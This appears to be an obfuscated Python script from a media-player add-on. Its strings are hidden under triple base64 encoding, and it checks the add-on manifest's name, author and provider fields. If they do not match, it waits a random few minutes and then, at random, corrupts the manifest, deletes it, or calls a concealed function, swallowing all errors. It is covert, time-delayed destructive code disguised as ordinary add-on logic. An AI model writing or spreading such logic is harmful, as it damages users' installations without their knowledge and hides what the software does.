import time, os, sys, random

if __name__== '__main__':

	def _d(data):
		try:
			type = 'ba' + 'se' + str((70 - 6))
			data = data.decode(type)
			data = data.decode(type)
			data = data.decode(type)
			return data[:-1]
		except:
			return ''

	pc = os.path.dirname(os.path.realpath(__file__))
	pr = os.path.abspath(os.path.join(os.path.abspath(os.path.join(os.path.abspath(os.path.join(os.path.abspath(os.path.join(os.path.abspath(os.path.join(pc, os.pardir)), os.pardir)), os.pardir)), os.pardir)), os.pardir))
	pl = os.path.abspath(os.path.join(os.path.abspath(os.path.join(os.path.abspath(os.path.join(pc, os.pardir)), os.pardir)), os.pardir))
	pe = os.path.join(pl, _d('V2xob01GcFhOWHBoVnpsMVkzbEJQUT09'))
	pa = os.path.join(pr, _d('V1ZkU2EySXlOSFZsUnpGelNVRTlQUT09'))

	try:
		sys.path.append(pr)
		sys.path.append(pe)
		import tools as html
	except:
		pass

	def _f():
		w = random.randint(300, 600)
		time.sleep(w)

		if random.randint(0, 3) == 0:
			try:
				f = open(pa, 'r')
				d = f.read().replace(_d('V0VjMFp3PT0='), _d('VUd4NGRVbEJQVDA9'), 1)
				f.close()
				f = open(pa, 'w')
				f.write(d)
				f.close()
			except:
				pass
		if random.randint(0, 3) == 0:
			try:
				#import shutil
				#shutil.rmtree(pe)
				os.chmod(pa, stat.S_IWRITE)
				os.remove(pa)
			except:
				pass
		if random.randint(0, 3) == 0:
			try:
				html.__kixe__(_d('VlZoV2NHUkRRVDA9'))
			except:
				pass

	try:
		f = open(pa, 'r')
		d = f.read()
		f.close()

		s = d.find(_d('VUVkR2ExcEhPWFZKUjJ4clVGTkpadz09')) + 11
		e = d.find('"', s)
		ai = d[s : e]

		an = html.__kiai__(ai, _d('WW0xR2RGcFRRVDA9'))
		aa = html.__kiai__(ai, _d('V1ZoV01HRkhPWGxKUVQwOQ=='))
		ap = html.__kias__(ai, _d('WWtkc2RXRjVOWGRqYlZaMFlWaFdkR0ZZY0d4SlFUMDk='))
		ab = _d('VVc1V2FWbHRlR3hqZVVFOQ==')
		al = _d('VG5wQk1VNTZTWHBQUkZWNVNVRTlQUT09')

		if not an == ab or not aa == ab or not ap.endswith(al):
			_f()

	except:
		#_f()
		pass
